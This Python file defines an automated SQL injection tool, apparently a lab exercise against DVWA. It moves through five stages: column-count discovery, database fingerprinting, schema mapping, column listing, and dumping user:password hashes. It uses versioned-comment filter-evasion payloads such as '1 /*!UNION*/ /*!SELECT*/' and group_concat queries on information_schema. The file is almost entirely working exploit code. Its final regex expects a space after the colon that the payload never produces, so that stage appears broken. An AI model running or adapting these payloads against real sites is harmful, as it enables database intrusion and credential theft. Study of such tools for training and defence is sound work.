import re
import time
import random
from utils.http_client import HTTPClient
from utils.success_validator import SuccessValidator

class ExfiltrationLab:
    """
    A completely independent "Second Lab" specialized strictly in Data Extraction.
    It operates as a sequential exploitation machine, moving from discovery to full dump.
    """
    def __init__(self, target_url, username, password, security_level="medium"):
        # Intelligently derive base_url from target_url
        base_url = target_url
        if "vulnerabilities" in target_url:
            base_url = target_url.split("vulnerabilities")[0]
        elif target_url.endswith(".php"):
            # Strip the filename to get the directory root
            base_url = "/".join(target_url.split("/")[:-1])
            
        self.client = HTTPClient(base_url)
        self.client.setup_dvwa(username, password, security_level)
        self.validator = SuccessValidator()
        
        self.column_count = 0
        self.db_info = {}
        self.tables = []
        self.target_table = "users" # Default target if discovered
        self.exfiltrated_data = []
        
        self.state = "INIT"
        self.history = []

    def run(self):
        """Main execution loop for the extraction specialist."""
        print("\n" + "="*50)
        print("  [EXTRACTOR LAB] Starting Specialist Operation")
        print("="*50 + "\n")

        stages = [
            self._discover_columns,
            self._identify_environment,
            self._list_tables,
            self._list_columns,
            self._dump_target_data
        ]

        for stage_fn in stages:
            success = stage_fn()
            if not success:
                print(f"[!] Extractor Lab: Stage {stage_fn.__name__} failed. Aborting.")
                self.state = "FAILED"
                break
            time.sleep(1)

        print("\n" + "="*50)
        print("  [EXTRACTOR LAB] Operation Complete")
        print("="*50)
        return self.exfiltrated_data

    def _discover_columns(self):
        print("[*] Stage 1: Column Count Discovery...")
        # Strategy: ORDER BY with obfuscation and various comments
        for i in range(1, 15):
            for comment in ["#", "-- -", "/*"]:
                # Using Versioned Comments for subtle bypass
                payload = f"1 /*!ORDER*/ /*!BY*/ {i}{comment}"
                res = self.client.send_request(payload)
                err = self.validator.get_sql_error(res['text'])
                if err and ("Unknown column" in err or "order clause" in err or "group clause" in err):
                    self.column_count = i - 1
                    print(f"[+] Found Column Count: {self.column_count}")
                    return True
        
        # Fallback: UNION Probing with Versioned Comments
        for i in range(1, 10):
            nulls = ",".join(["NULL"] * i)
            payload = f"1 /*!UNION*/ /*!SELECT*/ {nulls}#"
            res = self.client.send_request(payload)
            if res['status'] == 200 and not self.validator.get_sql_error(res['text']):
                # Double check success by provoking an error with one more NULL
                check_payload = f"1 /*!UNION*/ /*!SELECT*/ {nulls},NULL#"
                check_res = self.client.send_request(check_payload)
                if self.validator.get_sql_error(check_res['text']):
                    self.column_count = i
                    print(f"[+] Found Column Count (via UNION): {self.column_count}")
                    return True
                
        return False

    def _identify_environment(self):
        if self.column_count == 0: return False
        print("[*] Stage 2: Environmental Identification...")
        
        # Build a UNION SELECT where one column reflects our info
        cols = ["NULL"] * self.column_count
        # Usually DVWA reflects the 2nd column
        target_idx = 1 if self.column_count > 1 else 0
        cols[target_idx] = "CONCAT(0x7e,DATABASE(),0x3a,USER(),0x3a,VERSION(),0x7e)"
        
        payload = f"1 UNION SELECT {','.join(cols)}#"
        res = self.client.send_request(payload)
        
        match = re.search(r"~(.*?)~", res['text'])
        if match:
            info = match.group(1).split(":")
            self.db_info = {"db": info[0], "user": info[1], "ver": info[2]}
            print(f"[+] DB Info: {self.db_info}")
            return True
        return False

    def _list_tables(self):
        if self.column_count == 0: return False
        print("[*] Stage 3: Schema Mapping (Tables)...")
        target_idx = 1 if self.column_count > 1 else 0
        cols = ["NULL"] * self.column_count
        cols[target_idx] = "group_concat(table_name)"
        
        payload = f"1 UNION SELECT {','.join(cols)} FROM information_schema.tables WHERE table_schema=database()#"
        res = self.client.send_request(payload)
        
        # DVWA table reflection logic (assumes pre tags or similar containers)
        # Simplified: find anything that looks like a csv string in the response
        match = re.findall(r"([a-z0-9_]+(?:,[a-z0-9_]+)+)", res['text'])
        if match:
            self.tables = match[0].split(",")
            print(f"[+] Tables Found: {self.tables}")
            if "users" in self.tables:
                self.target_table = "users"
            return True
        return False

    def _list_columns(self):
        if self.column_count == 0: return False
        print(f"[*] Stage 4: Target Discovery (Table: {self.target_table})...")
        target_idx = 1 if self.column_count > 1 else 0
        cols = ["NULL"] * self.column_count
        cols[target_idx] = "group_concat(column_name)"
        
        table_hex = "0x" + "".join([f"{ord(c):02x}" for c in self.target_table])
        payload = f"1 UNION SELECT {','.join(cols)} FROM information_schema.columns WHERE table_name={table_hex}#"
        res = self.client.send_request(payload)
        
        match = re.findall(r"([a-z0-9_]+(?:,[a-z0-9_]+)+)", res['text'])
        if match:
            found_cols = match[0].split(",")
            print(f"[+] Columns in {self.target_table}: {found_cols}")
            return True
        return False

    def _dump_target_data(self):
        if self.column_count == 0: return False
        print(f"[*] Stage 5: Final Exfiltration (Dumping {self.target_table})...")
        target_idx = 1 if self.column_count > 1 else 0
        cols = ["NULL"] * self.column_count
        
        # Specific search for user/password fields
        cols[target_idx] = "group_concat(user,0x3a,password,0x7c)"
        
        payload = f"1 UNION SELECT {','.join(cols)} FROM {self.target_table}#"
        res = self.client.send_request(payload)
        
        # Look for user:pass patterns
        data_matches = re.findall(r"([a-zA-Z0-9_\-\.]+: [a-f0-9]{32})", res['text'])
        if data_matches:
            self.exfiltrated_data = data_matches
            print(f"[!!!] SUCCESS! Exfiltrated {len(data_matches)} records.")
            for row in self.exfiltrated_data:
                print(f"    -> {row}")
            return True
        return False
